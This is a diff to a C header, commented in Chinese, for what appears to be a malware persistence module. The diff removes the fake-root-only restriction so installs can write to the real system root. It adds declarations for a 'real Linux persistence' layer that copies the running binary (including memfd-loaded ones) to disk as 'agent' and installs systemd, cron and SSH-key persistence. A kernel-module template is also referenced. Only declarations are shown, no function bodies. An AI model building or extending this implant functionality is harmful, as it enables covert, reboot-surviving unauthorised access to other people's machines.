@@ -32,7 +32,8 @@ size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t c
 size_t persist_method_count(void);
 const persist_desc_t *persist_method_at(size_t i);
 
-/* 安装/卸载：以 root_prefix 作为假根，仅对文件型方法生效。
+/* 安装/卸载：root_prefix 为 NULL 时写真实根；非 NULL 时所有系统路径都
+ * 挂在该前缀下（用于测试，不污染宿主）。
  * 成功 0；平台不支持返回 -2；IO 失败返回 -1 */
 int persist_install(persist_method_t m, const char *root_prefix, const char *arg);
 int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg);
@@ -40,15 +41,33 @@ int persist_uninstall(persist_method_t m, const char *root_prefix, const char *a
 /* 内核态 LKM 模板源码（沙盒无内核头，不可编译验证，仅作交付物） */
 const char *persist_kernel_source(void);
 
-
-/* ---- 枚举（完整能力） ---- */
+/* ---- 枚举（真实路径） ---- */
 typedef void (*persist_cb_t)(persist_method_t m, const char *fname,
                              const char *fpath, void *ud);
 
-/* 扫描假根下已安装的持久化项，逐项回调。返回回调次数；-1 参数错误 */
+/* 扫描 root_prefix 下已安装的持久化项，逐项回调。返回回调次数；-1 参数错误 */
 int persist_enumerate(const char *root_prefix, persist_cb_t cb, void *ud);
 
-/* 查询某一方法在假根下是否已安装：1=已装 0=未装 -1=非文件型/参数错误 */
+/* 查询某一方法是否已安装：1=已装 0=未装 -1=非文件型/参数错误 */
 int persist_installed(const char *root_prefix, persist_method_t m);
+
+/* ---- Linux 真实持久化（非假根玩具） ---- */
+
+/* 落盘自身：把 /proc/self/exe 复制到 root_prefix+dir/agent。
+ * 父目录 0700，目标 0755。out_path 回填绝对路径。成功 0，失败 -1。
+ * 注：memfd 执行时 /proc/self/exe 指向该 memfd，仍可读出完整 ELF。 */
+int persist_drop_self(const char *root_prefix, const char *dir,
+                      char *out_path, size_t cap);
+
+/* 确保驻留：落盘 + 安装 systemd / cron / sshkey。
+ * 返回 0=新安装，1=已驻留（幂等），-1=失败。
+ * out_methods 按 {SYSTEMD, CRON, SSHKEY} 顺序回填安装后是否处于已装状态。 */
+int persist_linux_ensure(const char *root_prefix,
+                         char *out_bin_path, size_t cap,
+                         int *out_methods, size_t nm_methods);
+
+/* 查询已安装机制数（0..3），参数错误 -1。methods 同 ensure 顺序。 */
+int persist_linux_query(const char *root_prefix,
+                        int *out_methods, size_t nm_methods);
 
 #endif
